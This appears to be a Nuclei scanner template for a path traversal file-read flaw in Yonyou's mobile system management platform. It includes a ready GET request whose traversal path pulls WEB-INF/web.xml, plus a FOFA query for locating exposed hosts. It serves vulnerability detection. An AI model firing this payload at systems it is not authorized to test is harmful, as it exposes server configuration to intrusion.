id: yonyou-mobile-userfile-fileread

info:
  name: 用友移动系统管理平台 userfile - fileread
  author: zhxknb1
  severity: high
  description:
  reference:
    - todo
  metadata:
    verified: false
    fofa-query: app="用友-移动系统管理"
  tags: yonyou,mobile,lfi,oa

http:
  - method: GET
    path:
      - "{{BaseURL}}/mobsm/common/userfile?path=%5C..%5Cwebapps%5Cnc_web%5CWEB-INF%5Cweb.xml"

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"filter-name","servlet-name")'